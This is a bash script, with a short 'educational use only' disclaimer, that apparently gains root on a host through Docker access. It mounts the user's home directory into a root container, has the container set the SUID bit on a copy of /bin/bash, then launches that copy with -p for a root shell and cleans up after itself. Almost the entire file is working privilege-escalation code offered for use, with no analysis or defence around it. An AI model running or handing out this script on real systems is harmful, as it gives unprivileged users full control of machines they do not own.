#!/usr/bin/env bash
#====================== WARNING ======================#
# THIS SCRIPT IS FOR EDUCATIONAL/LEGITIMATE USE ONLY.
# UNAUTHORIZED USE MAY BE ILLEGAL OR UNETHICAL.
#=====================================================#
# --- Step 1: Create our wait.sh script on the host (will be copied to the container)
cat << 'EOF' > wait.sh
#!/bin/bash
echo "[*] Container: waiting for /root/root-me-pls..."
while [ ! -f /root/root-me-pls ]; do
    sleep 1
done

echo "[*] Container: found /root/root-me-pls. Setting SUID bit..."
chown root:root /root/root-me-pls
chmod 4755 /root/root-me-pls

echo "[*] Container: SUID bit set. You can now run ~/root-me-pls on the host."
# Keep container alive
tail -f /dev/null
EOF

chmod +x wait.sh

# --- Step 2: Pull and run Docker container
echo "[*] Pulling latest debian image..."
docker pull debian:latest

echo "[*] Starting container (named 'escape') in detached mode..."
docker run -d --name escape -v /home/$USER:/root/ debian tail -f /dev/null

# --- Step 3: Copy and run the wait.sh script in the container
echo "[*] Copying wait.sh into the container..."
docker cp wait.sh escape:/root/wait.sh
docker exec escape chmod +x /root/wait.sh

echo "[*] Running wait.sh in the container (in background)..."
docker exec -d escape /root/wait.sh

# --- Step 4: Wait briefly, then copy /bin/bash on the host into ~/root-me-pls
sleep 3
echo "[*] Copying /bin/bash on host to ~/root-me-pls..."
cp /bin/bash /home/$USER/root-me-pls

# --- Step 5: Give the container time to detect and set SUID
sleep 5
echo "[*] Checking permissions on ~/root-me-pls..."
#ls -l ~/root-me-pls

# --- Step 6: Attempt to execute the newly SUID-root file
echo "[*] Attempting to run SUID-root file. If successful, you should be root."
/home/$USER/root-me-pls -p


echo "[*] Cleaning up..."
docker stop escape >/dev/null 2>&1
docker rm escape >/dev/null 2>&1
rm -f ~/root-me-pls
rm -f wait.sh

echo "[*] Done!"

